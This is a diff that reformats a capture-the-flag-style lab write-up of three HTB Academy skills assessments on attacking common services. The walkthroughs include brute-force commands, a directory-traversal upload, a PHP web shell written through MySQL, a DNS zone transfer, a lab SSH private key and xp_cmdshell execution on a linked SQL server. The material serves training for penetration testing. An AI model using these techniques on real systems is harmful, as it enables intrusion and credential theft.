@@ -1,18 +1,21 @@
-# 🎯 Skills Assessment - Attacking Common Services
+# 🎯 Skills Assessment - Complete Attack Chain Scenarios
 
-## 🎯 Overview
+## 🎯 Skills Assessment - Attacking Common Services
+
+### 🎯 Overview
 
 This document covers the **Skills Assessment (Easy)** from HTB Academy's "Attacking Common Services" module. This practical exercise demonstrates a **complete attack chain** combining multiple service exploitation techniques to achieve the objective.
 
-> **Target Domain**: `inlanefreight.htb`  
-> **Objective**: "Assess the target server and obtain the contents of the flag.txt file"  
+> **Target Domain**: `inlanefreight.htb`\
+> **Objective**: "Assess the target server and obtain the contents of the flag.txt file"\
 > **Skills Tested**: Service enumeration, user enumeration, credential attacks, file system access, web shell deployment
 
----
+***
 
-## 🔍 Phase 1: Service Discovery & Enumeration
+### 🔍 Phase 1: Service Discovery & Enumeration
 
-### Initial Nmap Scan
+#### Initial Nmap Scan
+
 ```bash
 # HTB Academy Skills Assessment - Initial reconnaissance
 nmap -A 10.129.203.7
@@ -62,7 +65,8 @@ PORT     STATE SERVICE       VERSION
 |_  Auth Plugin Name: mysql_native_password
 ```
 
-### Key Services Identified
+#### Key Services Identified
+
 ```
 ✅ FTP (21)     - Core FTP Server 2.0 build 725
 ✅ SMTP (25)    - hMailServer 
@@ -72,11 +76,12 @@ PORT     STATE SERVICE       VERSION
 ✅ MySQL (3306) - MariaDB 10.4.24
 ```
 
----
+***
 
-## 👤 Phase 2: User Enumeration (SMTP)
+### 👤 Phase 2: User Enumeration (SMTP)
 
-### Download User Wordlist
+#### Download User Wordlist
+
 ```bash
 # HTB Academy provided users wordlist
 wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip
@@ -94,7 +99,8 @@ Archive:  users.zip
   inflating: users.list
 ```
 
-### SMTP User Enumeration
+#### SMTP User Enumeration
+
 ```bash
 # HTB Academy SMTP user enumeration
 /usr/bin/smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
@@ -124,11 +130,12 @@ Target domain ............ inlanefreight.htb
 
 **Result**: Valid user `fiona@inlanefreight.htb` discovered
 
----
+***
 
-## 🔐 Phase 3: Credential Attacks (FTP)
+### 🔐 Phase 3: Credential Attacks (FTP)
 
-### FTP Password Brute Force
+#### FTP Password Brute Force
+
 ```bash
 # HTB Academy FTP credential attack
 # CRITICAL: Use -t 1 to avoid 550 errors
@@ -147,11 +154,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-27 15:06:
 
 **Result**: Valid credentials `fiona:987654321` discovered
 
----
+***
 
-## 📂 Phase 4: FTP Intelligence Gathering
+### 📂 Phase 4: FTP Intelligence Gathering
 
-### FTP Access & File Download
+#### FTP Access & File Download
+
 ```bash
 # HTB Academy FTP access
 ftp 10.129.203.7
@@ -192,7 +200,8 @@ ftp> bye
 221 Goodbye
 ```
 
-### Critical Intelligence Analysis
+#### Critical Intelligence Analysis
+
 ```bash
 # HTB Academy intelligence analysis
 awk 1 WebServersInfo.txt
@@ -209,15 +218,17 @@ Test Command: curl http://localhost/test.php
 ```
 
 **Key Intelligence**:
-- CoreFTP server running on ports 21 & 443
-- Apache web root at `C:\xampp\htdocs\`
-- Authentication methods available via HTTPS
 
----
+* CoreFTP server running on ports 21 & 443
+* Apache web root at `C:\xampp\htdocs\`
+* Authentication methods available via HTTPS
 
-## 🚀 Phase 5: Exploitation - Method 1 (CoreFTP Directory Traversal)
+***
 
-### Vulnerability Research
+### 🚀 Phase 5: Exploitation - Method 1 (CoreFTP Directory Traversal)
+
+#### Vulnerability Research
+
 ```bash
 # HTB Academy exploit research
 searchsploit CoreFTP
@@ -242,7 +253,8 @@ File Type: ASCII text
 Copied to: /home/htb-ac413848/50652.txt
 ```
 
-### Exploit Analysis
+#### Exploit Analysis
+
 ```bash
 # HTB Academy exploit study
 cat 50652.txt
@@ -264,7 +276,8 @@ CoreFTP Server before 727 allows directory traversal (for file creation) by an a
 curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
 ```
 
-### Web Shell Upload via Directory Traversal
+#### Web Shell Upload via Directory Traversal
+
 ```bash
 # HTB Academy web shell deployment (Method 1)
 # Generate random filename: openssl rand -hex 16
@@ -279,11 +292,12 @@ Content-type: application/octet-stream
 Content-length: 36
 ```
 
----
+***
 
-## 🗄️ Phase 6: Exploitation - Method 2 (MySQL File Write)
+### 🗄️ Phase 6: Exploitation - Method 2 (MySQL File Write)
 
-### MySQL Access
+#### MySQL Access
+
 ```bash
 # HTB Academy MySQL access (Alternative method)
 mysql -u fiona -p987654321 -h 10.129.242.84
@@ -299,7 +313,8 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MariaDB [(none)]>
 ```
 
-### File Write Privilege Check
+#### File Write Privilege Check
+
 ```sql
 -- HTB Academy MySQL file operations check
 show variables like "secure_file_priv";
@@ -314,7 +329,8 @@ show variables like "secure_file_priv";
 
 **Result**: Empty value = File read/write operations allowed
 
-### Web Shell Creation via MySQL
+#### Web Shell Creation via MySQL
+
 ```sql
 -- HTB Academy web shell deployment (Method 2)
 -- Generate random filename: openssl rand -hex 16
@@ -323,11 +339,12 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/9095
 Query OK, 1 row affected (0.015 sec)
 ```
 
----
+***
 
-## 🎯 Phase 7: Flag Extraction
+### 🎯 Phase 7: Flag Extraction
 
-### Web Shell Execution
+#### Web Shell Execution
+
 ```bash
 # HTB Academy flag extraction
 # Method 1 shell usage:
@@ -341,12 +358,12 @@ curl -w "\n" http://10.129.242.84/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20
 HTB{...}
 ```
 
+***
 
----
+### 📊 Attack Chain Summary
 
-## 📊 Attack Chain Summary
+#### Complete Attack Flow
 
-### Complete Attack Flow
 ```
 1. Service Discovery    → Nmap scan (6 services identified)
 2. User Enumeration     → SMTP RCPT enumeration (fiona found)
@@ -359,7 +376,8 @@ HTB{...}
 7. Flag Extraction      → Web shell command execution
 ```
 
-### Services Utilized
+#### Services Utilized
+
 ```
 ✅ SMTP    - User enumeration (smtp-user-enum)
 ✅ FTP     - Credential attack (Hydra) + File access
@@ -368,7 +386,8 @@ HTB{...}
 ✅ MySQL   - Alternative file write method
 ```
 
-### Key Learning Points
+#### Key Learning Points
+
 ```
 1. Multi-Service Attack Chain
    - Combined 5 different services for complete compromise
@@ -390,11 +409,12 @@ HTB{...}
    - Web shell deployment and execution
 ```
 
----
+***
 
-## 🔧 Tools & Commands Reference
+### 🔧 Tools & Commands Reference
 
-### Complete Tool Chain Used
+#### Complete Tool Chain Used
+
 ```bash
 # Service Discovery
 nmap -A target_ip
@@ -425,32 +445,33 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/shel
 curl -w "\n" http://target_ip/shell.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
 ```
 
----
+***
 
-## 🔗 Related Documentation
+### 🔗 Related Documentation
 
-- **[SMTP Attacks](smtp-attacks.md)** - Email service enumeration
-- **[FTP Attacks](ftp-attacks.md)** - FTP exploitation techniques  
-- **[SQL Attacks](sql-attacks.md)** - MySQL file operations
-- **[HTB Academy](https://academy.hackthebox.com)** - Original module content
+* [**SMTP Attacks**](smtp-attacks.md) - Email service enumeration
+* [**FTP Attacks**](ftp-attacks.md) - FTP exploitation techniques
+* [**SQL Attacks**](sql-attacks.md) - MySQL file operations
+* [**HTB Academy**](https://academy.hackthebox.com) - Original module content
 
----
+***
 
-# 🎯 Skills Assessment - Medium Difficulty
+## 🎯 Skills Assessment - Medium Difficulty
 
-## 🎯 Overview - Medium Challenge
+### 🎯 Overview - Medium Challenge
 
 This document covers the **Skills Assessment (Medium)** from HTB Academy's "Attacking Common Services" module. This advanced exercise demonstrates a **complex attack chain** involving DNS enumeration, vHost discovery, anonymous FTP access, email exploitation, and SSH key-based authentication.
 
-> **Target Domain**: `inlanefreight.htb`  
-> **Objective**: "Assess the target server and find the flag.txt file"  
+> **Target Domain**: `inlanefreight.htb`\
+> **Objective**: "Assess the target server and find the flag.txt file"\
 > **Skills Tested**: DNS zone transfers, vHost enumeration, FTP intelligence gathering, POP3 attacks, SSH key extraction and usage
 
----
+***
 
-## 🔍 Phase 1: Service Discovery & DNS Enumeration
+### 🔍 Phase 1: Service Discovery & DNS Enumeration
 
-### Initial Nmap Scan
+#### Initial Nmap Scan
+
 ```bash
 # HTB Academy Skills Assessment Medium - Initial reconnaissance
 nmap -A 10.129.183.208
@@ -469,7 +490,8 @@ PORT     STATE SERVICE  VERSION
 
 **Key Discovery**: DNS server running on port 53 (BIND 9.16.1)
 
-### DNS Zone Transfer Attack
+#### DNS Zone Transfer Attack
+
 ```bash
 # HTB Academy DNS zone transfer exploitation
 dig AXFR inlanefreight.htb @10.129.183.208
@@ -497,17 +519,19 @@ inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 60
 
 **Critical Discovery**: `int-ftp.inlanefreight.htb` points to 127.0.0.1 (localhost)
 
----
+***
 
-## 🌐 Phase 2: vHost Configuration & Internal Service Discovery
+### 🌐 Phase 2: vHost Configuration & Internal Service Discovery
 
-### vHost Addition to Local Hosts
+#### vHost Addition to Local Hosts
+
 ```bash
 # HTB Academy vHost configuration for internal access
 sudo sh -c 'echo "10.129.183.208 int-ftp.inlanefreight.htb" >> /etc/hosts'
 ```
 
-### Internal FTP Service Discovery
+#### Internal FTP Service Discovery
+
 ```bash
 # HTB Academy internal FTP service enumeration
 nmap -p- -T4 -A int-ftp.inlanefreight.htb
@@ -528,11 +552,12 @@ PORT      STATE SERVICE      VERSION
 
 **Discovery**: ProFTPD server on non-standard port 30021
 
----
+***
 
-## 📂 Phase 3: Anonymous FTP Access & Intelligence Gathering
+### 📂 Phase 3: Anonymous FTP Access & Intelligence Gathering
 
-### Anonymous FTP Connection
+#### Anonymous FTP Connection
+
 ```bash
 # HTB Academy anonymous FTP access
 ftp int-ftp.inlanefreight.htb 30021
@@ -547,7 +572,8 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ```
 
-### File System Exploration
+#### File System Exploration
+
 ```bash
 # HTB Academy FTP directory listing
 ftp> ls
@@ -580,18 +606,20 @@ ftp> bye
 
 **Intelligence Gathered**: Password wordlist file `mynotes.txt` for user `simon`
 
----
+***
 
-## 🔐 Phase 4: POP3 Credential Attack
+### 🔐 Phase 4: POP3 Credential Attack
 
-### Password List Analysis
+#### Password List Analysis
+
 ```bash
 # HTB Academy wordlist content (mynotes.txt contains potential passwords)
 cat mynotes.txt
 # (Contains various password candidates for simon user)
 ```
 
-### POP3 Password Brute Force
+#### POP3 Password Brute Force
+
 ```bash
 # HTB Academy POP3 credential attack using discovered wordlist
 hydra -l simon -P mynotes.txt pop3://10.129.183.208
@@ -609,11 +637,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-27 17:32:
 
 **Result**: Valid credentials `simon:8Ns8j1b!23hs4921smHzwn` discovered
 
----
+***
 
-## 📧 Phase 5: POP3 Email Access & SSH Key Extraction
+### 📧 Phase 5: POP3 Email Access & SSH Key Extraction
 
-### POP3 Mail Access
+#### POP3 Mail Access
+
 ```bash
 # HTB Academy POP3 email access
 nc -nv 10.129.183.208 110
@@ -629,7 +658,8 @@ pass 8Ns8j1b!23hs4921smHzwn
 +OK Logged in.
 ```
 
-### Email Enumeration & Retrieval
+#### Email Enumeration & Retrieval
+
 ```bash
 # HTB Academy email listing and retrieval
 list
@@ -667,17 +697,19 @@ quit
 
 **Critical Discovery**: SSH private key for user `simon` obtained from email
 
----
+***
 
-## 🔐 Phase 6: SSH Key Processing & Authentication
+### 🔐 Phase 6: SSH Key Processing & Authentication
 
-### SSH Key Formatting
+#### SSH Key Formatting
+
 ```bash
 # HTB Academy SSH private key extraction and formatting
 echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----' | sed 's/ /\n/g' > id_rsa
 ```
 
-### Formatted SSH Private Key
+#### Formatted SSH Private Key
+
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
@@ -697,7 +729,8 @@ O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-### SSH Key Permissions & Access
+#### SSH Key Permissions & Access
+
 ```bash
 # HTB Academy SSH key permission setup
 chmod 600 id_rsa
@@ -713,22 +746,24 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 <SNIP>
 ```
 
----
+***
 
-## 🎯 Phase 7: Flag Extraction
+### 🎯 Phase 7: Flag Extraction
 
-### Final Flag Retrieval
+#### Final Flag Retrieval
+
 ```bash
 # HTB Academy flag extraction
 simon@lin-medium:~$ cat flag.txt
 HTB{...}
 ```
 
----
+***
 
-## 📊 Attack Chain Summary - Medium Difficulty
+### 📊 Attack Chain Summary - Medium Difficulty
 
-### Complete Attack Flow
+#### Complete Attack Flow
+
 ```
 1. Service Discovery    → Nmap scan (DNS service identified)
 2. DNS Zone Transfer    → AXFR query (internal hosts discovered)
@@ -742,7 +777,8 @@ HTB{...}
 10. Flag Extraction     → File system access as simon user
 ```
 
-### Services & Techniques Utilized
+#### Services & Techniques Utilized
+
 ```
 ✅ DNS      - Zone transfer exploitation (dig AXFR)
 ✅ vHost    - Internal service discovery (/etc/hosts)
@@ -752,7 +788,8 @@ HTB{...}
 ✅ SSH      - Private key authentication
 ```
 
-### Advanced Learning Points
+#### Advanced Learning Points
+
 ```
 1. DNS Zone Transfer Exploitation
    - AXFR queries for internal network discovery
@@ -775,11 +812,12 @@ HTB{...}
    - Each phase enabling the next attack vector
 ```
 
----
+***
 
-## 🔧 Complete Tool Chain - Medium Difficulty
+### 🔧 Complete Tool Chain - Medium Difficulty
 
-### Full Command Reference
+#### Full Command Reference
+
 ```bash
 # Service Discovery
 nmap -A target_ip
@@ -810,25 +848,27 @@ chmod 600 id_rsa
 ssh -i id_rsa username@target_ip
 ```
 
----
+***
 
-## 🔗 Skills Assessment Comparison
+### 🔗 Skills Assessment Comparison
 
-### Easy vs Medium Difficulty
+#### Easy vs Medium Difficulty
 
-#### **Easy Skills Assessment**
-- **Attack Chain**: 7 phases (Service Discovery → Web Shell → Flag)
-- **Services**: FTP, SMTP, HTTP, HTTPS, MySQL (5 services)
-- **Key Techniques**: User enumeration, credential attacks, directory traversal, file upload
-- **Complexity**: Medium - Multiple exploitation paths available
+**Easy Skills Assessment**
 
-#### **Medium Skills Assessment**
-- **Attack Chain**: 10 phases (DNS → vHost → SSH Key → Flag)
-- **Services**: DNS, FTP, POP3, SSH (4 services + vHost discovery)
-- **Key Techniques**: Zone transfers, internal service discovery, email intelligence, SSH keys
-- **Complexity**: High - Linear attack chain with each phase dependent on previous
+* **Attack Chain**: 7 phases (Service Discovery → Web Shell → Flag)
+* **Services**: FTP, SMTP, HTTP, HTTPS, MySQL (5 services)
+* **Key Techniques**: User enumeration, credential attacks, directory traversal, file upload
+* **Complexity**: Medium - Multiple exploitation paths available
 
-### Practical CPTS Skills Demonstrated
+**Medium Skills Assessment**
+
+* **Attack Chain**: 10 phases (DNS → vHost → SSH Key → Flag)
+* **Services**: DNS, FTP, POP3, SSH (4 services + vHost discovery)
+* **Key Techniques**: Zone transfers, internal service discovery, email intelligence, SSH keys
+* **Complexity**: High - Linear attack chain with each phase dependent on previous
+
+#### Practical CPTS Skills Demonstrated
 
 ```
 Easy Level:
@@ -848,23 +888,24 @@ Medium Level:
 ✅ Complex linear attack chains
 ```
 
----
+***
 
-# 🎯 Skills Assessment - Hard Difficulty
+## 🎯 Skills Assessment - Hard Difficulty
 
-## 🎯 Overview - Hard Challenge
+### 🎯 Overview - Hard Challenge
 
 This document covers the **Skills Assessment (Hard)** from HTB Academy's "Attacking Common Services" module. This expert-level exercise demonstrates **advanced Windows exploitation** involving SMB share enumeration, custom wordlist attacks, RDP authentication, SQL Server user impersonation, and linked server exploitation.
 
-> **Target Domain**: Windows environment with multiple services  
-> **Objective**: "Retrieve user files and obtain administrator flag"  
-> **Skills Tested**: SMB enumeration, credential attacks, RDP access, SQL Server impersonation, linked server attacks, xp_cmdshell exploitation
+> **Target Domain**: Windows environment with multiple services\
+> **Objective**: "Retrieve user files and obtain administrator flag"\
+> **Skills Tested**: SMB enumeration, credential attacks, RDP access, SQL Server impersonation, linked server attacks, xp\_cmdshell exploitation
 
----
+***
 
-## 🔍 Phase 1: Service Discovery & Windows Enumeration
+### 🔍 Phase 1: Service Discovery & Windows Enumeration
 
-### Initial Nmap Scan
+#### Initial Nmap Scan
+
 ```bash
 # HTB Academy Skills Assessment Hard - Windows target reconnaissance
 nmap -A -Pn 10.129.112.104
@@ -921,7 +962,8 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 
-### Key Services Identified
+#### Key Services Identified
+
 ```
 ✅ RPC (135)      - Microsoft Windows RPC
 ✅ SMB (445)      - Microsoft SMB (signing not required)
@@ -931,11 +973,12 @@ Host script results:
 
 **Target System**: WIN-HARD (Windows 10.0 Build 17763)
 
----
+***
 
-## 📂 Phase 2: SMB Share Enumeration & File Collection
+### 📂 Phase 2: SMB Share Enumeration & File Collection
 
-### SMB Share Discovery
+#### SMB Share Discovery
+
 ```bash
 # HTB Academy SMB share enumeration
 smbclient -N -L 10.129.112.104
@@ -951,7 +994,8 @@ SMB1 disabled -- no workgroup available
 
 **Discovery**: `Home` share available for anonymous access
 
-### SMB Share Exploration
+#### SMB Share Exploration
+
 ```bash
 # HTB Academy Home share access and exploration
 smbclient -N //10.129.112.104/Home
@@ -970,7 +1014,8 @@ smb: \> ls
 
 **Discovery**: Multiple department directories including `IT` department
 
-### User File Collection from IT Department
+#### User File Collection from IT Department
+
 ```bash
 # HTB Academy IT department file collection
 smb: \> cd IT\Fiona\
@@ -990,15 +1035,17 @@ getting file \IT\John\secrets.txt of size 99 as secrets.txt (2.4 KiloBytes/sec) 
 ```
 
 **Files Retrieved**:
-- From Simon: `random.txt` ✅ (Question 1 answer)
-- From Fiona: `creds.txt`
-- From John: `information.txt`, `notes.txt`, `secrets.txt`
 
----
+* From Simon: `random.txt` ✅ (Question 1 answer)
+* From Fiona: `creds.txt`
+* From John: `information.txt`, `notes.txt`, `secrets.txt`
 
-## 🔐 Phase 3: Custom Wordlist Creation & Credential Attacks
+***
 
-### Password Wordlist Compilation
+### 🔐 Phase 3: Custom Wordlist Creation & Credential Attacks
+
+#### Password Wordlist Compilation
+
 ```bash
 # HTB Academy custom wordlist creation from collected files
 cat creds.txt secrets.txt random.txt > passwords.txt
@@ -1006,7 +1053,8 @@ cat creds.txt secrets.txt random.txt > passwords.txt
 
 **Strategy**: Combine all potential password files from different users
 
-### SMB Credential Attack
+#### SMB Credential Attack
+
 ```bash
 # HTB Academy CrackMapExec SMB password attack
 sudo cme smb 10.129.112.104 -u fiona -p passwords.txt
@@ -1022,11 +1070,12 @@ SMB         10.129.112.104  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bn
 
 **Result**: Valid credentials `fiona:48Ns72!bns74@S84NNNSl` discovered ✅ (Question 2 answer)
 
----
+***
 
-## 🖥️ Phase 4: RDP Authentication & SQL Server Access
+### 🖥️ Phase 4: RDP Authentication & SQL Server Access
 
-### RDP Connection
+#### RDP Connection
+
 ```bash
 # HTB Academy RDP access with discovered credentials
 xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
@@ -1050,7 +1099,8 @@ Do you trust the above certificate? (Y/T/N) Y
 
 **Success**: RDP session established as user `fiona`
 
-### SQL Server Connection via Windows Authentication
+#### SQL Server Connection via Windows Authentication
+
 ```powershell
 # HTB Academy SQL Server connection using Windows Authentication
 Windows PowerShell
@@ -1062,11 +1112,12 @@ PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
 
 **Access**: SQLCMD connection established to local SQL Server instance
 
----
+***
 
-## 👤 Phase 5: SQL Server User Impersonation Discovery
+### 👤 Phase 5: SQL Server User Impersonation Discovery
 
-### Impersonation Privilege Enumeration
+#### Impersonation Privilege Enumeration
+
 ```sql
 -- HTB Academy SQL Server impersonation privilege discovery
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
@@ -1082,11 +1133,12 @@ simon
 
 **Discovery**: Users `john` and `simon` can be impersonated ✅ (Question 3 answer: john)
 
----
+***
 
-## 🔗 Phase 6: Linked Server Discovery & Exploitation
+### 🔗 Phase 6: Linked Server Discovery & Exploitation
 
-### Linked Server Enumeration
+#### Linked Server Enumeration
+
 ```sql
 -- HTB Academy linked server discovery
 SELECT srvname, isremote FROM sysservers
@@ -1100,11 +1152,13 @@ LOCAL.TEST.LINKED.SRV              0
 (2 rows affected)
 ```
 
-**Discovery**: 
-- `WINSRV02\SQLEXPRESS` (remote server)
-- `LOCAL.TEST.LINKED.SRV` (linked server)
+**Discovery**:
 
-### User Impersonation & Linked Server Access
+* `WINSRV02\SQLEXPRESS` (remote server)
+* `LOCAL.TEST.LINKED.SRV` (linked server)
+
+#### User Impersonation & Linked Server Access
+
 ```sql
 -- HTB Academy john user impersonation and linked server sysadmin check
 EXECUTE AS LOGIN = 'john'
@@ -1120,16 +1174,18 @@ WINSRV02\SQLEXPRESS Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
 (1 rows affected)
 ```
 
-**Critical Discovery**: 
-- User `john` can access `LOCAL.TEST.LINKED.SRV`
-- On linked server, `john` has `sysadmin` privileges as `testadmin`
-- Target server: `WINSRV02\SQLEXPRESS`
+**Critical Discovery**:
 
----
+* User `john` can access `LOCAL.TEST.LINKED.SRV`
+* On linked server, `john` has `sysadmin` privileges as `testadmin`
+* Target server: `WINSRV02\SQLEXPRESS`
 
-## 💻 Phase 7: xp_cmdshell Enablement & Command Execution
+***
 
-### xp_cmdshell Configuration
+### 💻 Phase 7: xp\_cmdshell Enablement & Command Execution
+
+#### xp\_cmdshell Configuration
+
 ```sql
 -- HTB Academy xp_cmdshell enablement on linked server
 EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
@@ -1139,9 +1195,10 @@ Configuration option 'show advanced options' changed from 0 to 1. Run the RECONF
 Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 ```
 
-**Success**: xp_cmdshell enabled on linked server for command execution
+**Success**: xp\_cmdshell enabled on linked server for command execution
 
-### Administrator Flag Extraction
+#### Administrator Flag Extraction
+
 ```sql
 -- HTB Academy administrator flag retrieval via xp_cmdshell
 EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
@@ -1155,12 +1212,12 @@ NULL
 (2 rows affected)
 ```
 
+***
 
----
+### 📊 Attack Chain Summary - Hard Difficulty
 
-## 📊 Attack Chain Summary - Hard Difficulty
+#### Complete Attack Flow
 
-### Complete Attack Flow
 ```
 1. Service Discovery    → Nmap scan (Windows services identified)
 2. SMB Share Enumeration → Anonymous access to Home share
@@ -1177,7 +1234,8 @@ NULL
 13. Administrator Access → Flag extraction from remote system
 ```
 
-### Advanced Services & Techniques
+#### Advanced Services & Techniques
+
 ```
 ✅ SMB      - Anonymous share access, file collection
 ✅ Custom   - Multi-user wordlist compilation  
@@ -1188,7 +1246,8 @@ NULL
 ✅ xp_cmdshell - Remote command execution via SQL
 ```
 
-### Expert Learning Points
+#### Expert Learning Points
+
 ```
 1. Windows Multi-Service Exploitation
    - SMB anonymous access for intelligence gathering
@@ -1216,11 +1275,12 @@ NULL
    - Administrative privilege escalation paths
 ```
 
----
+***
 
-## 🔧 Complete Tool Chain - Hard Difficulty
+### 🔧 Complete Tool Chain - Hard Difficulty
 
-### Full Command Reference
+#### Full Command Reference
+
 ```bash
 # Service Discovery
 nmap -A -Pn target_ip
@@ -1257,31 +1317,34 @@ EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LINKED.SERVER
 EXECUTE('xp_cmdshell ''command''') AT [LINKED.SERVER]
 ```
 
----
+***
 
-## 🔗 Complete Skills Assessment Trilogy
+### 🔗 Complete Skills Assessment Trilogy
 
-### Difficulty Progression Overview
+#### Difficulty Progression Overview
 
-#### **Easy Skills Assessment**
-- **Attack Chain**: 7 phases (Basic multi-service exploitation)
-- **Services**: FTP, SMTP, HTTP, HTTPS, MySQL (5 services)
-- **Complexity**: Medium - Multiple exploitation paths
-- **Key Skills**: Service enumeration, credential attacks, directory traversal
+**Easy Skills Assessment**
 
-#### **Medium Skills Assessment**
-- **Attack Chain**: 10 phases (Advanced linear dependency chain)
-- **Services**: DNS, vHost, FTP, POP3, Email, SSH (6 services)
-- **Complexity**: High - Each phase enables next attack
-- **Key Skills**: Zone transfers, vHost discovery, SSH key extraction
+* **Attack Chain**: 7 phases (Basic multi-service exploitation)
+* **Services**: FTP, SMTP, HTTP, HTTPS, MySQL (5 services)
+* **Complexity**: Medium - Multiple exploitation paths
+* **Key Skills**: Service enumeration, credential attacks, directory traversal
 
-#### **Hard Skills Assessment**
-- **Attack Chain**: 13 phases (Expert Windows enterprise exploitation)
-- **Services**: SMB, RDP, SQL Server, Linked Servers (4+ services)
-- **Complexity**: Expert - Cross-server privilege escalation
-- **Key Skills**: Windows authentication, SQL impersonation, linked server attacks
+**Medium Skills Assessment**
 
-### Complete CPTS Skills Matrix
+* **Attack Chain**: 10 phases (Advanced linear dependency chain)
+* **Services**: DNS, vHost, FTP, POP3, Email, SSH (6 services)
+* **Complexity**: High - Each phase enables next attack
+* **Key Skills**: Zone transfers, vHost discovery, SSH key extraction
+
+**Hard Skills Assessment**
+
+* **Attack Chain**: 13 phases (Expert Windows enterprise exploitation)
+* **Services**: SMB, RDP, SQL Server, Linked Servers (4+ services)
+* **Complexity**: Expert - Cross-server privilege escalation
+* **Key Skills**: Windows authentication, SQL impersonation, linked server attacks
+
+#### Complete CPTS Skills Matrix
 
 ```
 Foundation Level (Easy):
@@ -1304,6 +1367,6 @@ Advanced Level (Hard):
 ✅ Administrative privilege escalation
 ```
 
----
+***
 
-*This complete Skills Assessment trilogy provides comprehensive practical scenarios spanning beginner to expert levels, demonstrating the full spectrum of attack techniques covered in the "Attacking Common Services" module for thorough CPTS exam preparation.* 
+_This complete Skills Assessment trilogy provides comprehensive practical scenarios spanning beginner to expert levels, demonstrating the full spectrum of attack techniques covered in the "Attacking Common Services" module for thorough CPTS exam preparation._
